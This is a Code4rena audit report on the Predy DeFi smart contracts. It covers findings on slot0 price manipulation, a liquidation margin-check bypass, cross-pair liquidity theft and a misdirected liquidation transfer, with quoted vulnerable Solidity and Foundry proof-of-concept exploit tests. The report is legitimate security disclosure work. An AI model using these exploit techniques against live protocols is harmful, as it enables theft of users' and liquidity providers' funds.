---
sponsor: "Predy"
slug: "2024-05-predy"
date: "2024-07-16"
title: "Predy"
findings: "https://github.com/code-423n4/2024-05-predy-findings/issues"
contest: 383
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Predy smart contract system written in Solidity. The audit took place between May 24 — June 14, 2024.

## Wardens

75 Wardens contributed reports to Predy:

  1. [pkqs90](https://code4rena.com/@pkqs90)
  2. [Eeyore](https://code4rena.com/@Eeyore)
  3. [nnez](https://code4rena.com/@nnez)
  4. [gumgumzum](https://code4rena.com/@gumgumzum)
  5. [zhaojohnson](https://code4rena.com/@zhaojohnson)
  6. [Bauchibred](https://code4rena.com/@Bauchibred)
  7. [Rhaydden](https://code4rena.com/@Rhaydden)
  8. [Tigerfrake](https://code4rena.com/@Tigerfrake)
  9. [0xhere2learn](https://code4rena.com/@0xhere2learn)
  10. [Sathish9098](https://code4rena.com/@Sathish9098)
  11. [ayden](https://code4rena.com/@ayden)
  12. [TECHFUND-inc](https://code4rena.com/@TECHFUND-inc)
  13. [web3km](https://code4rena.com/@web3km)
  14. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  15. [Yunaci](https://code4rena.com/@Yunaci) ([cholakov](https://code4rena.com/@cholakov) and [Vancelot](https://code4rena.com/@Vancelot))
  16. [emmac002](https://code4rena.com/@emmac002)
  17. [crypticdefense](https://code4rena.com/@crypticdefense)
  18. [BlockSafe](https://code4rena.com/@BlockSafe) ([Daniel526](https://code4rena.com/@Daniel526) and [PrasadLak](https://code4rena.com/@PrasadLak))
  19. [WinSec](https://code4rena.com/@WinSec) ([ni8mare](https://code4rena.com/@ni8mare), [0xanmol](https://code4rena.com/@0xanmol) and [0xweb3boy](https://code4rena.com/@0xweb3boy))
  20. [3n0ch](https://code4rena.com/@3n0ch)
  21. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  22. [Takarez](https://code4rena.com/@Takarez)
  23. [air\_0x](https://code4rena.com/@air_0x)
  24. [Naresh](https://code4rena.com/@Naresh)
  25. [Sparrow](https://code4rena.com/@Sparrow)
  26. [kodyvim](https://code4rena.com/@kodyvim)
  27. [erictee](https://code4rena.com/@erictee)
  28. [julian\_avantgarde](https://code4rena.com/@julian_avantgarde)
  29. [lightoasis](https://code4rena.com/@lightoasis)
  30. [josephdara](https://code4rena.com/@josephdara)
  31. [Kaysoft](https://code4rena.com/@Kaysoft)
  32. [SBSecurity](https://code4rena.com/@SBSecurity) ([Slavcheww](https://code4rena.com/@Slavcheww) and [Blckhv](https://code4rena.com/@Blckhv))
  33. [jolah1](https://code4rena.com/@jolah1)
  34. [0xabhay](https://code4rena.com/@0xabhay)
  35. [Giorgio](https://code4rena.com/@Giorgio)
  36. [0xhashiman](https://code4rena.com/@0xhashiman)
  37. [grearlake](https://code4rena.com/@grearlake)
  38. [LuarSec](https://code4rena.com/@LuarSec) ([GhK3Ndf](https://code4rena.com/@GhK3Ndf) and [lod1n](https://code4rena.com/@lod1n))
  39. [dyoff](https://code4rena.com/@dyoff)
  40. [0xMilenov](https://code4rena.com/@0xMilenov)
  41. [shaflow2](https://code4rena.com/@shaflow2)
  42. [forgebyola](https://code4rena.com/@forgebyola)
  43. [DPS](https://code4rena.com/@DPS) ([yvuchev](https://code4rena.com/@yvuchev) and [0xJaeger](https://code4rena.com/@0xJaeger))
  44. [Joshuajee](https://code4rena.com/@Joshuajee)
  45. [MSaptarshi](https://code4rena.com/@MSaptarshi)
  46. [lydia\_m\_t](https://code4rena.com/@lydia_m_t)
  47. [MrCrowNFT](https://code4rena.com/@MrCrowNFT)
  48. [EaglesSecurity](https://code4rena.com/@EaglesSecurity) ([julian\_avantgarde](https://code4rena.com/@julian_avantgarde) and [kane-goldmisth](https://code4rena.com/@kane-goldmisth))
  49. [chista0x](https://code4rena.com/@chista0x)
  50. [Norah](https://code4rena.com/@Norah)
  51. [atoko](https://code4rena.com/@atoko)
  52. [0xb0k0](https://code4rena.com/@0xb0k0)
  53. [Bigsam](https://code4rena.com/@Bigsam)
  54. [JC](https://code4rena.com/@JC)
  55. [unix515](https://code4rena.com/@unix515)
  56. [Pelz](https://code4rena.com/@Pelz)
  57. [0xHash](https://code4rena.com/@0xHash)
  58. [biakia](https://code4rena.com/@biakia)
  59. [mt030d](https://code4rena.com/@mt030d)
  60. [Neo\_Granicen](https://code4rena.com/@Neo_Granicen)
  61. [0xAkira](https://code4rena.com/@0xAkira)
  62. [golu](https://code4rena.com/@golu)
  63. [y0ng0p3](https://code4rena.com/@y0ng0p3)
  64. [steadyman](https://code4rena.com/@steadyman)
  65. [Abhan](https://code4rena.com/@Abhan)
  66. [Tripathi](https://code4rena.com/@Tripathi)
  67. [0xlucky](https://code4rena.com/@0xlucky)

This audit was judged by [0xsomeone](https://code4rena.com/@0xsomeone).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 12 unique vulnerabilities. Of these vulnerabilities, 4 received a risk rating in the category of HIGH severity and 8 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 4 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Predy repository](https://github.com/code-423n4/2024-05-predy), and is composed of 55 smart contracts written in the Solidity programming language and includes 4909 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (4)
## [[H-01] Reallocation depends on the `slot0` price, which can be manipulated](https://github.com/code-423n4/2024-05-predy-findings/issues/209)
*Submitted by [ayden](https://github.com/code-423n4/2024-05-predy-findings/issues/209), also found by [ZanyBonzy](https://github.com/code-423n4/2024-05-predy-findings/issues/305), [emmac002](https://github.com/code-423n4/2024-05-predy-findings/issues/303), [Tigerfrake](https://github.com/code-423n4/2024-05-predy-findings/issues/301), [BlockSafe](https://github.com/code-423n4/2024-05-predy-findings/issues/203), [0xhere2learn](https://github.com/code-423n4/2024-05-predy-findings/issues/198), [Yunaci](https://github.com/code-423n4/2024-05-predy-findings/issues/82), [air\_0x](https://github.com/code-423n4/2024-05-predy-findings/issues/304), and [Takarez](https://github.com/code-423n4/2024-05-predy-findings/issues/213)*

Anyone can invoke the `reallocate` function to reallocate the LP position to be within the desired range. Whether reallocation is necessary depends on the `slot0` price. However, the `slot0` price can be manipulated, potentially leading to the LP position being out of the current range and resulting in a loss of yield for the protocol.

### Proof of Concept

Reallocate first read `slot0` [Perp.sol::reallocate](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/Perp.sol#L202-L206) to get current price:

```solidity
	function reallocate(
	    DataType.PairStatus storage _assetStatusUnderlying,
	    SqrtPerpAssetStatus storage _sqrtAssetStatus
	) internal returns (bool, bool, int256 deltaPositionBase, int256 deltaPositionQuote) {
>      (uint160 currentSqrtPrice, int24 currentTick,,,,,) = IUniswapV3Pool(_sqrtAssetStatus.uniswapPool).slot0();
```

Then, compare current price with the threshold [Perp.sol::reallocate](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/Perp.sol#L236-L246):

```solidity
// if the current tick does reach the threshold, then rebalance
int24 tick;
bool isOutOfRange;

if (currentTick < _sqrtAssetStatus.tickLower) {
    // lower out
    isOutOfRange = true;
    tick = _sqrtAssetStatus.tickLower;
} else if (currentTick < _sqrtAssetStatus.tickUpper) {
    // in range
    isOutOfRange = false;
} else {
    // upper out
    isOutOfRange = true;
    tick = _sqrtAssetStatus.tickUpper;
}
```

Once out of range protocol invoke [Perp.sol::swapForOutOfRange](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/Perp.sol#L304-L326) to update rebalance position:

```solidity
    function swapForOutOfRange(
        DataType.PairStatus storage pairStatus,
        uint160 _currentSqrtPrice,
        int24 _tick,
        uint128 _totalLiquidityAmount
    ) internal returns (int256 deltaPositionBase, int256 deltaPositionQuote) {
        uint160 tickSqrtPrice = TickMath.getSqrtRatioAtTick(_tick);

        // 1/_currentSqrtPrice - 1/tickSqrtPrice
        int256 deltaPosition0 =
            LPMath.calculateAmount0ForLiquidity(_currentSqrtPrice, tickSqrtPrice, _totalLiquidityAmount, true);

        // _currentSqrtPrice - tickSqrtPrice
        int256 deltaPosition1 =
            LPMath.calculateAmount1ForLiquidity(_currentSqrtPrice, tickSqrtPrice, _totalLiquidityAmount, true);

        if (pairStatus.isQuoteZero) {
            deltaPositionQuote = -deltaPosition0;
            deltaPositionBase = -deltaPosition1;
        } else {
            deltaPositionBase = -deltaPosition0;
            deltaPositionQuote = -deltaPosition1;
        }

        updateRebalancePosition(pairStatus, deltaPosition0, deltaPosition1);
    }
```

### Tools Used

Foundry

### Recommended Mitigation Steps

It's recommend to use TWAP price instead of `slot0` price to get the current price.

### Assessed type

Invalid Validation

**[0xsomeone (judge) increased severity to High and commented](https://github.com/code-423n4/2024-05-predy-findings/issues/209#issuecomment-2197255640):**
 > The submission and its duplicates detail how the re-allocation of the pool's positions will occur via a permissionless mechanism that will rely on the spot square root price evaluation of the Uniswap V3 pair.
> 
> This interaction is insecure, as a user can manipulate the square root price of a pair momentarily to an unfavorable price point, force a re-allocation to occur, and then capitalize on the re-allocated liquidity in an extreme tick range that would effectively result in a loss for the pool.
> 
> I believe this vulnerability merits a high-risk rating as it can be trivially exploited and would result in financial loss for a pair's liquidity providers. To note, a re-allocation will also incur fees associated with the swaps performed by the `Perp` mechanism thereby permitting multiple re-allocations to continuously drain the funds involved in a particular `pairId` position exacerbating the effects of the issue described.

**[Tripathi (warden) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/209#issuecomment-2198659025):**
> Root cause of the above and issue [#157](https://github.com/code-423n4/2024-05-predy-findings/issues/157) is the same, which is manipulation of the `slot0` price. Even though both issues explain different impacts, they originate from the same root cause, so they should be grouped together.
> 
> For example, if an oracle gives an incorrect price, there could be multiple impacts like liquidation failure, withdrawal pause, or deposit pause; but I don't think we can create different sets for each impact. Here, the root cause is the same, and both issue can be mitigated by preventing manipulation of the `slot0` price

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/209#issuecomment-2208452429):**
 > @Tripathi - The root cause is not manipulation of the `slot0` data point, but rather how the `slot0` data point is consumed in a different way across two distinct contracts. Given that different code segments give birth to the vulnerability, different impact is observed on each one, and that mitigation of one would not resolve the other (as we cannot change the Uniswap code), the submissions will remain distinct.


**[Tripathi (warden) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/209#issuecomment-2209134608):**
 > We agree that the impact is different, but the affected code is the same and is implemented multiple times.
> 
> It is similar to using transfer instead of `safetransfer`. In some places, it will lead to high impact and in others, it will lead to less impact. Again, we will have to change every transfer function to `safetransfer`(As mitigation of one would not resolve the other), but it used to be considered the same group of issues.
> 
> > The root cause is not manipulation of the `slot0` data point, but rather how the `slot0` data point is consumed in a different way across two distinct contracts
> 
> The root cause is indeed using the spot price from the DEX, which can be manipulated by external factors.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/209#issuecomment-2212512313):**
> It is important to understand that not all vulnerabilities are equal and just because some code is the same across the codebase does not necessarily mean it is a problem. As an example, a re-entrancy vulnerability stemming from the same external call at different instances of the codebase would be treated distinctly as the re-entrancy itself is not the problem; how the data points in the contract are processed is.
> 
> In this instance, the `slot0` has multiple data points and the vulnerabilities require a different approach to being resolved. Simply implementing a TWAP for the re-allocation mechanism is incorrect as that would make the re-allocation system permanently inefficient. Additionally, the re-allocation `slot0` vulnerability also utilizes the current tick which is incorrect as well. 
> 
> Fixing the `currentSqrtPrice` to use a TWAP would be insufficient as the current tick would be used as well. To properly address this vulnerability, a potential re-design might be warranted which would require a privileged role to perform re-allocations, re-allocations to be authorized via a signature, and other such secondary security measures that would prevent both the malleable tick and square root price from being used.
> 
> The less severe issue #157 will solely utilize the square root price data point, and using a TWAP in that case is safe and a sound approach. 
> 
> While I appreciate your diligent review of this submission and its sibling #157, I will maintain them as separate due to a reasonable alleviation for one exhibit being inapplicable for the other. To sum up:
> 
> - Different code segments and contracts are involved
> - One exhibit uses 1 data point while the other uses 2 data points
> - A TWAP solution would be applicable to one and a different solution would need to be applied to the other

**[syuhei176 (Predy) confirmed](https://github.com/code-423n4/2024-05-predy-findings/issues/209#event-13521776600)**

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-05-predy-findings/issues/209).*

***

## [[H-02] Liquidators can bypass remaining negative margin check and leave the loss to the protocol](https://github.com/code-423n4/2024-05-predy-findings/issues/189)
*Submitted by [nnez](https://github.com/code-423n4/2024-05-predy-findings/issues/189), also found by [Eeyore](https://github.com/code-423n4/2024-05-predy-findings/issues/105), [pkqs90](https://github.com/code-423n4/2024-05-predy-findings/issues/28), and [zhaojohnson](https://github.com/code-423n4/2024-05-predy-findings/issues/9)*

Liquidators can profit from protocol insolvency

### Description

At the end of liquidation process, in the case of no remaining position, `liquidate` function checks for remaining margin of the liquidating vault. If there is *positive* remaining amount, it proceeds to send those margin back to vault's recipient.

On contrary, if there is `negative` remaining amount, liquidator must pay (compensate) for those negative amounts.

This mechanism exists to protect against protocol insolvency in the case that vault's margin *cannot* cover the loss from vault's position.

### Liquidation incentives

Liquidators close vault's position, settle the trade and profit from slippage tolerance, set by the pool's owner. For instance, if the slippage tolerance is set at 5% and let's say liquidator is closing this long position:

    amountBase: 1 ETH
    amountQuote: -3,000 USDC
    entryValue: 3,000 USDC
    currentPrice: 2,500 USDC

Liquidator will get 1 ETH to sell for 2,500 USDC and have to return only `2500 * 0.95 = 2,375` USDC. The remaining short USDC will be deducted from vault's margin, in this case, `3000 - 2375 = 625` USDC.

Considering this mechanism, liquidators will always profit from the slippage.

### Vulnerability

If we take a look at the snippet of the code responsible for the aforementioned protection mechanism.

[LiquidationLogic.sol#L89-L108](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/logic/LiquidationLogic.sol#L89-L108):

    if (!hasPosition) {
        int256 remainingMargin = vault.margin;

        if (remainingMargin > 0) {
            if (vault.recipient != address(0)) {
                // Send the remaining margin to the recipient.
                vault.margin = 0;

                sentMarginAmount = uint256(remainingMargin);

                ERC20(pairStatus.quotePool.token).safeTransfer(vault.recipient, sentMarginAmount);
            }
        } else if (remainingMargin < 0) {
            vault.margin = 0;

            // To prevent the liquidator from unfairly profiting through arbitrage trades in the AMM and passing losses onto the protocol,
            // any losses that cannot be covered by the vault must be compensated by the liquidator
            ERC20(pairStatus.quotePool.token).safeTransferFrom(msg.sender, address(this), uint256(-remainingMargin));
        }
    }

The `liquidation` function only checks for negative margin if and only if the position is fully closed from liquidation. Therefore, if the position is not fully closed (99.99% closed) and left with negative margin, liquidators don't have to compensate for the loss.

Considering the case where liquidation of a full position would result in negative margin, liquidators should only be incentivized to partially close a position to the point that vault's margin becomes zero because that would be their maximum profit.

However, with the logic flaw mentioned, liquidators can increase their profit by closing nearly full position (99.99% closed), effectively leaving the loss to the protocol.

### Proof-of-Concept

This test demonstrates that liquidating nearly full position can bypass the negative margin check and leave the loss to the protocol.

- Add the below test in `2024-05-predy/test/pool/ExecLiquidationCall.t.sol`.
- Run `forge test --match-contract TestExecLiquidationCall --match-test testLiquidateSucceedsWithNegativeMarginRemaining -vv`:

```

        function testLiquidateSucceedsWithNegativeMarginRemaining() public {
            console2.log("[>] Opening a long perp position, amount=500e6 | margin=100e6");
            IPredyPool.TradeParams memory tradeParams =
                IPredyPool.TradeParams(1, 0, 500 * 1e6, 0, abi.encode(_getTradeAfterParams(100 * 1e6)));
            _tradeMarket.trade(tradeParams, _getSettlementData(Constants.Q96));

            IPredyPool.VaultStatus memory vaultStatus = _predyPoolQuoter.quoteVaultStatus(1);
            console2.log("[>] Vault's value: %s", vaultStatus.vaultValue);
            
            console2.log("[>] Magically make price lower");
            _movePrice(false, 10 * 1e16);
            vm.warp(block.timestamp + 1 minutes);
            console2.log("[>] Magically make price lower again and warp for TWAP");
            _movePrice(false, 5 * 1e16);
            vm.warp(block.timestamp + 29 minutes);

            vaultStatus = _predyPoolQuoter.quoteVaultStatus(1);
            console2.log("[>] Vault's value: %s", vaultStatus.vaultValue);
            console2.log("[>] Vault's margin: %s", vaultStatus.position.margin );
            console2.log("[>] Vault's quote position: %s", vaultStatus.position.amountQuote );
            console2.log("[>] Vault's base position: %s", vaultStatus.position.amountBase );

            uint indexPrice = predyPool.getSqrtIndexPrice(1);

            IFillerMarket.SettlementParams memory settlementParams =
                _getDebugSettlementData( indexPrice * 8950/10000 , type(uint).max);

            console2.log("[>] Position is now liquidatable, liquidates almost all position to leave the position open");
            IPredyPool.TradeResult memory tradeResult = _tradeMarket.execLiquidationCall(1, 0.99999e18, settlementParams);
            vaultStatus = _predyPoolQuoter.quoteVaultStatus(1);
            console2.log("[>] Vault is liquidated, left with negative margin");
            assertLt(vaultStatus.position.margin, 0);
            console2.log("[>] Vault's margin: %s", vaultStatus.position.margin );
            console2.log("[>] Vault's quote position: %s", vaultStatus.position.amountQuote );
            console2.log("[>] Vault's base position: %s", vaultStatus.position.amountBase );
            console2.log("[>] Position's perpPayoff: %s", tradeResult.payoff.perpPayoff);
        }
```

### Recommended Mitigation

If the remaining margin in the vault is equal or less than zero, then there is no need to check whether there is still an open position; because it is already effectively closed (no margin left). Therefore, a check for negative margin should be moved out from `if(!hasPosition)` block.

### Suggested fix

    if (!hasPosition) {
        int256 remainingMargin = vault.margin;

        if (remainingMargin > 0) {
            if (vault.recipient != address(0)) {
                // Send the remaining margin to the recipient.
                vault.margin = 0;

                sentMarginAmount = uint256(remainingMargin);

                ERC20(pairStatus.quotePool.token).safeTransfer(vault.recipient, sentMarginAmount);
            }
        }
    }
    else{
        if (remainingMargin < 0) {
            vault.margin = 0;

            // To prevent the liquidator from unfairly profiting through arbitrage trades in the AMM and passing losses onto the protocol,
            // any losses that cannot be covered by the vault must be compensated by the liquidator
            ERC20(pairStatus.quotePool.token).safeTransferFrom(msg.sender, address(this), uint256(-remainingMargin));
        }
    }

### Rationale for Medium severity

Value leaks from protocol (insolvency) but it only happens in certain situations, i.e., price drops sharply.

**[syuhei176 (Predy) confirmed via duplicate Issue #9](https://github.com/code-423n4/2024-05-predy-findings/issues/9#event-13188138029)**

**[0xsomeone (judge) increased severity to High and commented](https://github.com/code-423n4/2024-05-predy-findings/issues/189#issuecomment-2197235948):**
 > The Warden has demonstrated how the stop-loss mechanism of the protocol is improperly applied only when a vault is closed in its entirety, permitting liquidators to close a vault whilst leaving a minuscule remainder within it to bypass the mechanism and thus profit at the expense of the protocol.
> 
> I believe a high severity rating is appropriate given that the vulnerability can be reliably exploited and will further deteriorate a negative market event with tangible monetary impact.

***

## [[H-03] One pair can steal another pair's Uniswap liquidity during `reallocate()` call if both pairs operate on the same Uniswap pool and both have the same upper and lower tick during reallocation](https://github.com/code-423n4/2024-05-predy-findings/issues/49)
*Submitted by [Eeyore](https://github.com/code-423n4/2024-05-predy-findings/issues/49), also found by [nnez](https://github.com/code-423n4/2024-05-predy-findings/issues/224)*

During the reallocation of a pair, the Predy protocol does not verify that the liquidity in the Uniswap pool between the upper and lower tick belongs exclusively to that pair. Instead, it takes the entire liquidity from the range that the pair currently operates within.

In a scenario where a trusted operator creates two pairs for the same Uniswap pool, perhaps to have different quote tokens as margin tokens, there is a possibility that both pairs will have the same upper and lower tick setup.

In such a situation, if a user trades gamma on the first pair, and later the price moves outside the threshold of the second pair, if anyone performs a reallocation on that second pair, even if there were no gamma trades on the second pair, the second pair will steal liquidity from the user's open gamma position.

This will cause all accounting within the protocol for these two pairs to be compromised.

### Impact

Internal protocol accounting will be disrupted, potentially making it impossible to close or liquidate positions properly.

### Proof of Concept

1. A trusted operator registers a pair for USDC/ETH with USDC as the quote token.
2. The same trusted operator registers another pair for USDC/ETH with ETH as the quote token.
3. Both pairs have the same lower and upper tick settings.
4. A user trades gamma on the first pair.
5. The price moves outside the threshold of the second pair, threshold setting can differ between them.
6. Any user can trigger a `reallocate()` function call on the second pair, even if it originally had no liquidity because there were no gamma trades.
7. Liquidity is diverted from the first pair, despite no benefit to any user, resulting in incorrect accounting for users of the first pair.

Note: In such a scenario, the user's gamma position in the first pair cannot be closed properly. Any reallocation done on the first pair operates with empty liquidity, making it impossible to liquidate the user's gamma positions.

### PoC Tests

This test illustrates how to one pair steals other pair liquidity.

Create `test/PoC/TestPoCReallocate.t.sol` and run `forge test --match-test testPoCReallocateStealFromOtherPair -vvvv`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {TestPool} from "../pool/Setup.t.sol";
import {TestTradeMarket} from "../mocks/TestTradeMarket.sol";
import {IPredyPool} from "../../src/interfaces/IPredyPool.sol";
import {IFillerMarket} from "../../src/interfaces/IFillerMarket.sol";
import {Constants} from "../../src/libraries/Constants.sol";

contract TestPoCReallocate is TestPool {
    TestTradeMarket private tradeMarket;
    address private filler;

    function setUp() public override {
        TestPool.setUp();

        registerPair(address(currency1), address(0));
        registerPair(address(currency1), address(0));

        predyPool.supply(1, true, 1e8);
        predyPool.supply(1, false, 1e8);

        predyPool.supply(2, true, 1e8);
        predyPool.supply(2, false, 1e8);

        tradeMarket = new TestTradeMarket(predyPool);

        filler = vm.addr(12);

        currency0.transfer(address(tradeMarket), 1e8);
        currency1.transfer(address(tradeMarket), 1e8);

        currency0.approve(address(tradeMarket), 1e8);
        currency1.approve(address(tradeMarket), 1e8);

        currency0.mint(filler, 1e10);
        currency1.mint(filler, 1e10);
        vm.startPrank(filler);
        currency0.approve(address(tradeMarket), 1e10);
        currency1.approve(address(tradeMarket), 1e10);
        vm.stopPrank();
    }

    function testPoCReallocateStealFromOtherPair() public {
        // user opens gamma position on pair with id = 1
        {
            IPredyPool.TradeParams memory tradeParams =
                IPredyPool.TradeParams(1, 0, -90000, 100000, abi.encode(_getTradeAfterParams(2 * 1e6)));

            tradeMarket.trade(tradeParams, _getSettlementData(Constants.Q96));
        }

        _movePrice(true, 5 * 1e16);

        // reallocation on pair id = 2 steals from pair id = 1
        assertTrue(tradeMarket.reallocate(2, _getSettlementData(Constants.Q96 * 15000 / 10000)));

        _movePrice(true, 5 * 1e16);

        // reallocation on pair id = 1 can be done but there is 0 liquidity
        assertTrue(tradeMarket.reallocate(1, _getSettlementData(Constants.Q96 * 15000 / 10000)));

        // user can't close his position on pair with id = 1, internal accounting is broken
        {
            IPredyPool.TradeParams memory tradeParams =
                IPredyPool.TradeParams(1, 1, 90000, -100000, abi.encode(_getTradeAfterParams(2 * 1e6)));

            tradeMarket.trade(tradeParams, _getSettlementData(Constants.Q96));
        }
    }
}
```

### Recommended Mitigation Steps

1. Perform internal accounting of the liquidity mined within each pair and allow reallocation of only that amount of liquidity during the `reallocate()` function call.
2. Collect fees from the range proportionally to the liquidity held by each pair.

### Assessed type

Uniswap

**[syuhei176 (Predy) confirmed and commented](https://github.com/code-423n4/2024-05-predy-findings/issues/49#issuecomment-2173810793):**
 > A great find.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/49#issuecomment-2197233951):**
 > The Warden and its duplicate have demonstrated that the accounting system of the Predy pool will be compromised in case overlapping Uniswap V3 tick ranges are utilized in distinct pair instances with the same tokens.
> 
> The severity of the submission has been aptly demonstrated by the PoC provided, and a trusted party is involved within it. Per the audit's description, the trusted operator role should only be able to add new pairs to the system, and being able to maliciously take advantage of this permission to the effect described by the PoC is sufficient in rendering this submission a valid HM vulnerability. 
> 
> In reality, the operator will add pairs requested by normal users (per the duplicate submission's contents) and a pair configuration with the same range and token pair but a different quote token would appear innocuous and could easily be presumed as a valid action.

***

## [[H-04] Liquidation incorrectly tries to transfer token from Market instead of liquidator if `remainingMargin` is negative](https://github.com/code-423n4/2024-05-predy-findings/issues/27)
*Submitted by [pkqs90](https://github.com/code-423n4/2024-05-predy-findings/issues/27)*

Liquidation cannot be executed if there is bad debt (vault position is negative) after liquidation.

### Bug Description

See the liquidation flowchart [here](https://docs.predy.finance/predy-v6/dev/architecture/flowchart#execliquidationcall).

The liquidator would call a Market contract, which triggers the liquidation logic in PredyPool. The tokens would then be swapped accordingly using the `SettlementCallbackLib`.

The issue is during the end of liquidation, if the position is entirely wiped out (e.g. `hasPosition == false` in the following code), the code checks whether there is still margin left in the vault.

1. If there is still margin left, the remaining margin would be sent to the `vault.recipient` address.
2. If there is bad debt (negative margin value), the liquidator must pay for this.

For case 2, the code tries to transfer token from `msg.sender` to PredyPool. However, the `msg.sender` is the Market protocol, and not the liquidator. This means liquidating a vault with negative margin is impossible, and this bad debt will never be cleared. What's worse, the lending fees would still accumulate for this vault, and the bad debt keeps getting larger.

```solidity
    function liquidate(
        uint256 vaultId,
        uint256 closeRatio,
        GlobalDataLibrary.GlobalData storage globalData,
        bytes memory settlementData
    ) external returns (IPredyPool.TradeResult memory tradeResult) {
        ...
        if (!hasPosition) {
            int256 remainingMargin = vault.margin;

            if (remainingMargin > 0) {
                if (vault.recipient != address(0)) {
                    // Send the remaining margin to the recipient.
                    vault.margin = 0;

                    sentMarginAmount = uint256(remainingMargin);

                    ERC20(pairStatus.quotePool.token).safeTransfer(vault.recipient, sentMarginAmount);
                }
            } else if (remainingMargin < 0) {
                vault.margin = 0;

>               // To prevent the liquidator from unfairly profiting through arbitrage trades in the AMM and passing losses onto the protocol,
>               // any losses that cannot be covered by the vault must be compensated by the liquidator
>               ERC20(pairStatus.quotePool.token).safeTransferFrom(msg.sender, address(this), uint256(-remainingMargin));
            }
        }
        ...
    }
```

### Recommended Mitigation Steps

Transfer `quoteTokens` from the liquidator instead of the Market protocol.

### Assessed type

Token-Transfer

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/27#issuecomment-2197666451):**
 > The code outlined represents the intended design as the caller's funds (i.e., liquidators) must be used, and the markets are responsible for acquiring the relevant funds from their respective callers.

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/27#issuecomment-2197870166):**
 > @0xsomeone - Let me first describe my understanding of how liquidation works:
> 
> 1. Liquidator calls PerpMarket (the [execLiquidationCall()](https://github.com/code-423n4/2024-05-predy/blob/main/src/base/BaseMarket.sol#L47) function in BaseMarket) to start a liquidation
> 2. PerpMarket calls PredyPool's [execLiquidationCall()](https://github.com/code-423n4/2024-05-predy/blob/main/src/base/BaseMarket.sol#L47)
> 3. PredyPool callsback PerpMarket `SettlementCallbackLib` to handle token swap. Take [SettlementCallbackLib sell()](https://github.com/code-423n4/2024-05-predy/blob/main/src/base/SettlementCallbackLib.sol#L99-L108) as an example. The `sender` here is the user's address, instead of the PerpMarket's. Tokens are swapped between user and PredyPool:
>
> ```solidity
>         if (settlementParams.contractAddress == address(0)) {
>             // direct fill
>             uint256 quoteAmount = sellAmount * price / Constants.Q96;
> 
>             predyPool.take(false, sender, sellAmount);
> 
>             ERC20(quoteToken).safeTransferFrom(sender, address(predyPool), quoteAmount);
> 
>             return;
>         }
> ```
>
> 4. After swap, PredyPool checks the swap price is in a valid range by [SlippageLib.checkPrice()](https://github.com/code-423n4/2024-05-predy/blob/main/src/libraries/logic/LiquidationLogic.sol#L80-L85).
> 5. If the liquidation leads to negative margin, someone should pay the bad debt.
>
> ```solidity
>             else if (remainingMargin < 0) {
>                 vault.margin = 0;
> 
> >               // To prevent the liquidator from unfairly profiting through arbitrage trades in the AMM and passing losses onto the protocol,
> >               // any losses that cannot be covered by the vault must be compensated by the liquidator
> >               ERC20(pairStatus.quotePool.token).safeTransferFrom(msg.sender, address(this), uint256(-remainingMargin));
>             }
> ```
> 
> In step 5, it transfers tokens from PerpMarket instead of from the user. However, PerpMarket doesn't have token allowance to PredyPool, so the transfer would always fail. Secondly, I did not find documentation saying markets are *responsible acquiring the relevant funds from their respective callers*.
> 
> So maybe I'm missing something here. I also did not find any unit tests related to such scenario. 

**[syuhei176 (Predy) confirmed and commented](https://github.com/code-423n4/2024-05-predy-findings/issues/27#issuecomment-2198539939):**
 > I missed this report. As @pkqs90  mentioned, regarding non-performing loans, they are compensated from the market contract within the liquidate function's `safeTransferFrom`. The processing on the market contract side has not yet been implemented. This should have been pointed out beginning the audit.
> 
> This issue is the `liquidationCall` version of [Issue #26](https://github.com/code-423n4/2024-05-predy-findings/issues/26). Therefore, this report is valid.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/27#issuecomment-2208385281):**
> I agree with the facts shared here, and this exhibit will be re-opened as a valid high-risk submission. To note, I had mentioned that rulings might change after PJQA and Sponsor input for all exhibits that were marked as unsatisfactory during the validation round and would be revisited after appropriate feedback has been gathered.

**[Eeyore (warden) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/27#issuecomment-2208737250):**
 > @0xsomeone - I agree there is an issue in the BaseMarket contract and all the contracts that inherit from it, but it does not affect the ability to liquidate any position.
> 
> Every position can be liquidated directly by calling `PreayPool.execLiquidationCall()` with the same parameters as in `Base.execLiquidationCall()` there is no blocker for liquidators to build its own solution to support `IHooks.predySettlementCallback()`, and the position will be liquidated even when the vault position is negative.
> 
> Therefore, I disagree with categorizing this issue as High.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-05-predy-findings/issues/27#issuecomment-2212509996):**
